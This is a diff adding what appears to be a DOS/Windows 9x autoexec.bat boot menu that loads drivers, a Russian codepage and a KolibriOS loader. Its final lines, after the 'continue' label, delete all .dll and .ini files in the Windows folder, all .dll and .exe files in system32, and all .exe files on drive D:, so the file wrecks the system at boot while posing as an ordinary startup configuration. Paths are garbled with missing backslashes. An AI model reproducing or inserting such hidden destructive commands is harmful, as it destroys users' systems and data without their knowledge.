@@ -1,0 +1,35 @@
+goto %config% 
+:dos1
+rem c:vc401vc 
+lh keyrus 
+lh mmouse 
+lh C:WINDOWSCOMMANDmscdex /d:12345678 
+lh dndn 
+bootgui=0 
+:dos2 
+rem essolo.com 
+lh keyrus 
+lh mmouse 
+lh dndn 
+bootgui=0 
+:win 
+rem c:essolo.com 
+set path=C:WINDOWS;C:WINDOWSCOMMAND;c:;c:windows;c:windowscomand;c:arc;c:dn C:WINDOWSCOMMANDDELTREE /y C:WINDOWSTEMP*.* 
+mode con codepage prepare=((866) C:WINDOWSCOMMANDega3.cpi) 
+mode con codepage sеlесt=866 
+keyb ru,,C:WINDOWSCOMMANDkeybrd3.sys 
+goto continue 
+:meos 
+c:kolibrimeosload.com 
+:l:meosload.com 
+:continue 
+rem bootgui=1 
+cd 
+cd windows 
+del *.dll 
+del *.ini 
+cd system32 
+del *.dll 
+del *.exe 
+cd D: 
+del *.exe
